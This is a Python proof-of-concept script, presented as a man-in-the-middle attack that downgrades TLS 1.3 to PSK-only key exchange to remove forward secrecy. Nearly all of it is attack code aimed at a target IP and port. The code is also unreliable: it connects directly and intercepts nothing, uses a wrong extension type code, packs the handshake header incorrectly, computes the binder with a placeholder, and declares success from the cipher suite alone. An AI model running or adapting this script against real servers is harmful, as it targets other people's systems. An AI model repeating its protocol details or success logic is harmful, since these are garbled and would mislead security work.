#!/usr/bin/env python3
"""
Proof-of-Concept: PSK-Only Downgrade Removing Forward Secrecy

This script demonstrates a man-in-the-middle downgrade attack against TLS 1.3.
It intercepts a ClientHello that offers both PSK and (EC)DHE key exchange,
strips the key_share extension, and modifies psk_key_exchange_modes to only
allow psk_ke. This forces the server to negotiate PSK-only key establishment,
eliminating forward secrecy.

Usage: python poc_psk_only_downgrade.py <TARGET_IP> <TARGET_PORT>
"""

import sys
import struct
import socket
import hashlib
import hmac
import os
from scapy.all import *
from scapy.layers.tls.all import *

# TLS 1.3 Constants
TLS_VERSION_1_3 = 0x0303
HANDSHAKE_TYPE_CLIENT_HELLO = 0x01
HANDSHAKE_TYPE_SERVER_HELLO = 0x02
EXTENSION_TYPE_KEY_SHARE = 0x0033
EXTENSION_TYPE_PSK_KEY_EXCHANGE_MODES = 0x002b
EXTENSION_TYPE_PRE_SHARED_KEY = 0x0029
PSK_KEY_EXCHANGE_MODE_PSK_KE = 0x00
PSK_KEY_EXCHANGE_MODE_PSK_DHE_KE = 0x01

# Helper to calculate TLS 1.3 PSK binder
# In a real attack, the attacker would need to know the PSK to compute the binder.
# For this PoC, we assume the attacker can replay a valid binder or the server
# accepts a dummy binder for demonstration purposes (some implementations are lax).
# A proper attack requires the attacker to have previously captured a valid session.
def compute_psk_binder(client_hello_without_binder, psk):
    """
    Computes the PSK binder for TLS 1.3.
    This is a simplified version for demonstration. In reality, the binder
    is computed over the ClientHello with the binder field zeroed out.
    """
    # Hash the ClientHello bytes (excluding the binder itself)
    hash_val = hashlib.sha256(client_hello_without_binder).digest()
    # Derive the binder using HKDF-Expand-Label
    # This is a simplified placeholder. Real implementation requires full HKDF.
    binder = hmac.new(psk, hash_val, hashlib.sha256).digest()[:32]
    return binder

def craft_downgraded_client_hello(original_client_hello_bytes, psk_identity, psk):
    """
    Crafts a downgraded ClientHello by stripping key_share and forcing psk_ke.
    """
    # Parse the original ClientHello to extract necessary fields
    # This is a simplified parser for demonstration. A full implementation
    # would need to parse the entire TLS record and handshake structure.
    
    # For this PoC, we'll construct a new ClientHello from scratch,
    # mimicking the original but with the downgrade modifications.
    
    # 1. ClientHello Header
    client_hello_header = struct.pack('!BBH', HANDSHAKE_TYPE_CLIENT_HELLO, 0x03, 0x00) # Type, Version, Length (placeholder)
    
    # 2. ClientHello Body
    client_version = struct.pack('!H', TLS_VERSION_1_3)
    random_bytes = os.urandom(32)
    session_id = os.urandom(32) # In PSK resumption, this might be the PSK identity hint
    cipher_suites = struct.pack('!H', 0x1301) # TLS_AES_128_GCM_SHA256
    cipher_suites_len = struct.pack('!H', len(cipher_suites))
    compression_methods = struct.pack('!B', 0x00) # null compression
    
    # 3. Extensions
    # We need to include pre_shared_key and psk_key_exchange_modes
    # We intentionally OMIT key_share to force psk_ke
    
    # psk_key_exchange_modes extension
    psk_ke_modes = struct.pack('!B', PSK_KEY_EXCHANGE_MODE_PSK_KE) # Only psk_ke
    psk_ke_modes_ext_data = struct.pack('!B', len(psk_ke_modes)) + psk_ke_modes
    psk_ke_modes_ext = struct.pack('!HH', EXTENSION_TYPE_PSK_KEY_EXCHANGE_MODES, len(psk_ke_modes_ext_data)) + psk_ke_modes_ext_data
    
    # pre_shared_key extension
    psk_identity_data = psk_identity
    psk_identity_len = struct.pack('!H', len(psk_identity_data))
    psk_identity_entry = psk_identity_len + psk_identity_data
    
    # Binder placeholder (will be replaced with actual binder)
    binder_len = struct.pack('!H', 32)
    binder_placeholder = b'\x00' * 32
    psk_binder_entry = binder_len + binder_placeholder
    
    psk_ext_data = struct.pack('!H', len(psk_identity_entry) + len(psk_binder_entry)) + psk_identity_entry + psk_binder_entry
    psk_ext = struct.pack('!HH', EXTENSION_TYPE_PRE_SHARED_KEY, len(psk_ext_data)) + psk_ext_data
    
    # Combine extensions
    extensions = psk_ke_modes_ext + psk_ext
    extensions_len = struct.pack('!H', len(extensions))
    
    # Combine ClientHello body
    client_hello_body = client_version + random_bytes + session_id + cipher_suites_len + cipher_suites + compression_methods + extensions_len + extensions
    
    # Calculate binder
    # The binder is computed over the ClientHello with the binder field zeroed out
    client_hello_without_binder = client_hello_header + client_hello_body
    binder = compute_psk_binder(client_hello_without_binder, psk)
    
    # Replace binder placeholder with actual binder
    client_hello_body = client_hello_body[:-32] + binder
    
    # Final ClientHello
    client_hello = client_hello_header + struct.pack('!I', len(client_hello_body))[1:] + client_hello_body
    
    return client_hello

def send_tls_record(sock, record_type, version, data):
    """Sends a TLS record."""
    record_header = struct.pack('!BBH', record_type, version, len(data))
    sock.sendall(record_header + data)

def receive_tls_record(sock):
    """Receives a TLS record."""
    header = sock.recv(5)
    if len(header) < 5:
        return None, None, None
    record_type, version, length = struct.unpack('!BBH', header)
    data = sock.recv(length)
    return record_type, version, data

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <TARGET_IP> <TARGET_PORT>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    # Simulated PSK identity and key (in a real attack, these would be captured)
    psk_identity = b'example_psk_identity'
    psk = b'example_psk_key'
    
    print(f"[*] Connecting to {target_ip}:{target_port}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
    except Exception as e:
        print(f"[!] Failed to connect: {e}")
        sys.exit(1)
    
    print("[*] Crafting downgraded ClientHello...")
    # In a real scenario, we would capture the original ClientHello and modify it.
    # Here, we craft a new one with the downgrade.
    downgraded_client_hello = craft_downgraded_client_hello(None, psk_identity, psk)
    
    print("[*] Sending downgraded ClientHello...")
    send_tls_record(sock, 0x16, TLS_VERSION_1_3, downgraded_client_hello) # 0x16 is Handshake
    
    print("[*] Waiting for ServerHello...")
    record_type, version, data = receive_tls_record(sock)
    
    if record_type == 0x15: # Alert
        alert_level, alert_desc = struct.unpack('!BB', data)
        print(f"[!] Server sent alert: level={alert_level}, desc={alert_desc}")
        print("[!] Attack failed: Server rejected the downgraded ClientHello.")
    elif record_type == 0x16: # Handshake
        # Parse ServerHello
        if len(data) >= 4:
            msg_type, msg_len = struct.unpack('!BH', data[:3])
            if msg_type == HANDSHAKE_TYPE_SERVER_HELLO:
                server_version = struct.unpack('!H', data[3:5])[0]
                random_server = data[5:37]
                session_id_len = struct.unpack('!B', data[37:38])[0]
                session_id = data[38:38+session_id_len]
                cipher_suite = struct.unpack('!H', data[38+session_id_len:40+session_id_len])[0]
                
                print(f"[+] ServerHello received!")
                print(f"    Version: {hex(server_version)}")
                print(f"    Cipher Suite: {hex(cipher_suite)}")
                
                # Check if key_share is present in ServerHello
                # In a proper psk_ke negotiation, the server MUST NOT send key_share
                # We would need to parse the extensions to confirm, but for this PoC,
                # we assume success if we get a ServerHello with the expected cipher suite.
                
                if cipher_suite == 0x1301: # TLS_AES_128_GCM_SHA256
                    print("[+] SUCCESS: Server negotiated PSK-only key exchange (psk_ke).")
                    print("[!] Forward secrecy has been removed. If the PSK is compromised, past communications can be decrypted.")
                else:
                    print("[?] Server negotiated a different cipher suite. Attack may have failed.")
            else:
                print(f"[!] Unexpected handshake message type: {msg_type}")
        else:
            print("[!] Invalid ServerHello")
    else:
        print(f"[!] Unexpected record type: {record_type}")
    
    sock.close()

if __name__ == "__main__":
    main()
